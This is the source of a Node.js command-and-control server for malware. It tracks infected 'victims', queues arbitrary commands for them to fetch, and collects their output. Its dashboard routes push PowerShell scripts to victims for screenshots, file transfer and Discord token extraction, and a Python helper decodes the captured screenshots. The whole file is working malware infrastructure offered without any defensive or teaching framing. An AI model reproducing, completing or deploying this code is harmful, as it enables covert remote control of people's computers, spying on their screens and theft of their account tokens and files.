import { spawn } from "child_process";
import express from "express";
import cors from "cors";
import bodyParser from "body-parser";
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";

// Fix __dirname in ES modules
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Let Express trust proxy headers (important for Cloudflare)
app.set("trust proxy", true);

// ====== State ======
const commandQueue = new Map(); // identity -> array of commands
const victimsLastSeen = new Map(); // identity -> { last_seen, id }
const idToIdentity = new Map(); // short_id -> identity
let nextVictimId = 1;
let outputLog = [];
let current_command = "";

// ====== Helpers ======
function getIdentity(req) {
  const realIp =
    req.headers["cf-connecting-ip"] ||
    req.headers["x-forwarded-for"]?.split(",")[0].trim() ||
    req.ip ||
    req.connection.remoteAddress;

  const userAgent = req.headers["user-agent"] || "unknown";
  return `${realIp} | ${userAgent}`;
}

function ensureVictim(identity) {
  if (!victimsLastSeen.has(identity)) {
    const shortId = `victim${nextVictimId++}`;
    victimsLastSeen.set(identity, { last_seen: Date.now() / 1000, id: shortId });
    idToIdentity.set(shortId, identity);
    commandQueue.set(identity, []);
    console.log(`[New Victim] ${shortId}: ${identity}`);
  } else {
    victimsLastSeen.get(identity).last_seen = Date.now() / 1000;
  }
}

// ====== Routes ======

// Victim fetching commands
app.get("/commands", (req, res) => {
  const identity = getIdentity(req);
  ensureVictim(identity);

  const queue = commandQueue.get(identity) || [];
  if (queue.length > 0) {
    const cmd = queue.shift();
    console.log(`[Sent to ${victimsLastSeen.get(identity).id}] ${cmd}`);
    return res.send(cmd);
  }
  res.send("noop");
});

// Dashboard clear all data
app.post("/api/clear", (req, res) => {
  victimsLastSeen.clear();
  idToIdentity.clear();
  commandQueue.clear();
  outputLog = [];
  nextVictimId = 1;
  console.log("[Dashboard] Cleared all victim and log data");
  res.sendStatus(200);
});

function handleScreenshot(output_data) {
      console.log("Handling Screenshot Data...");
      const pythonProcess = spawn(
        "python",
        ["Decode_Screenshot.py", output_data],
        { cwd: "programs/screenshot" } 
      );
      console.log("Spawned Python.");
      pythonProcess.stdout.on('data', (data) => {
        console.log(data.toString()); // this will print output from Decode_Screenshot.py
      });
      current_command = "";
}
// TODO: Implement These two functions.
//  [ ] handleFileTransfer needs a python decoder 
//  [ ] handleDiscordTokenExtract needs to place output json in /temp folder
function handleFileTransfer(output_data) {
      console.log("Handling File Transfer Data...");
      current_command = "";
}
function handleDiscordTokenExtract(output_data) {
      console.log("Handling Discord Token Data...");
      current_command = "";
}

function handleOutput(output_data) {
  switch (current_command) {
    case "/send_screenshot":
      handleScreenshot(output_data);
      console.log("Done Handling Screenshot.");
      return;
    case "/send_file_transfer":
      handleFileTransfer(output_data);
      return;
    case "/send_discord_token_extract":
      handleDiscordTokenExtract(output_data);
      return;
  }
}

// Victim sending output
app.post("/output", (req, res) => {
  const identity = getIdentity(req);
  ensureVictim(identity);

  const output = req.body.output;
  const ack = req.body.ack;
  const shortId = victimsLastSeen.get(identity).id;
  
  if (output) {
    console.log(`[${shortId} Output]\n${output}`);
    handleOutput(output);
    outputLog.push({
      victim_id: shortId,
      timestamp: new Date().toISOString().replace("T", " ").slice(0, 19),
      output,
    });
    if (outputLog.length > 10) outputLog.shift();
  }
  if (ack) {
    console.log(`[${shortId} ACK]: ${ack}`);
  }
  res.send("OK");
});

// Dashboard broadcast calc
app.post("/send-calc", (req, res) => {
  for (const identity of victimsLastSeen.keys()) {
    commandQueue.get(identity).push("start calc");
  }
  console.log("[Dashboard] Broadcasted 'start calc' to all victims");
  res.sendStatus(200);
});

// Dashboard screenshot victim screen
app.post("/send_screenshot", (req, res) => {
  current_command = "/send_screenshot"
  const { victim_id } = req.body;
  const identity = idToIdentity.get(victim_id);
  if (!identity) return res.status(400).send("Invalid victim ID");

  const scriptPath = path.join(__dirname, "programs", "screenshot", "Screenshot.ps1");
  let command;
  try {
    command = fs.readFileSync(scriptPath, "utf8");
  } catch (err) {
    console.error("Failed to read Screenshot.ps1:", err);
    return res.status(500).send("Failed to load screenshot script");
  }

  commandQueue.get(identity).push(command);
  console.log(`[Dashboard] Sent screenshot command to ${victim_id}`);
  res.sendStatus(200);
});

app.post("/send_file_transfer", (req, res) => {
  const { victim_id } = req.body;
  const identity = idToIdentity.get(victim_id);
  if (!identity) return res.status(400).send("Invalid victim ID");

  const scriptPath = path.join(__dirname, "programs", "filetransfer", "FileTransfer.ps1");
  let command;
  try {
    command = fs.readFileSync(scriptPath, "utf8");
  } catch (err) {
    console.error("Failed to read FileTransfer.ps1:", err);
    return res.status(500).send("Failed to load filetransfer script");
  }

  commandQueue.get(identity).push(command);
  console.log(`[Dashboard] Sent screenshot command to ${victim_id}`);
  res.sendStatus(200);
});

app.post("/send_discord_token_extract", (req, res) => {
  const { victim_id } = req.body;
  const identity = idToIdentity.get(victim_id);
  if (!identity) return res.status(400).send("Invalid victim ID");

  const scriptPath = path.join(__dirname, "programs", "discordtokens", "DiscordExtract.ps1");
  let command;
  try {
    command = fs.readFileSync(scriptPath, "utf8");
  } catch (err) {
    console.error("Failed to read DiscordExtract.ps1:", err);
    return res.status(500).send("Failed to load DiscordExtract script");
  }

  commandQueue.get(identity).push(command);
  console.log(`[Dashboard] Sent discord token extraction command to ${victim_id}`);
  res.sendStatus(200);
});

// Dashboard send command to victim
app.post("/send_command", (req, res) => {
  const { victim_id, command } = req.body;
  const identity = idToIdentity.get(victim_id);
  if (!identity) return res.status(400).send("Invalid victim ID");

  commandQueue.get(identity).push(command);
  console.log(`[Dashboard] Sent command '${command}' to ${victim_id}`);
  res.sendStatus(200);
});

// Dashboard data
app.get("/api/dashboard", (req, res) => {
  const now = Date.now() / 1000;
  const victims = {};
  for (const [identity, data] of victimsLastSeen.entries()) {
    victims[identity] = {
      id: data.id,
      last_seen: data.last_seen,
    };
  }
  res.json({ victims, output_log: outputLog, now });
});


// ====== Start Server ======
const PORT = 8000;
app.listen(PORT, () => {
  console.log(`C2 server running on port ${PORT}`);
});

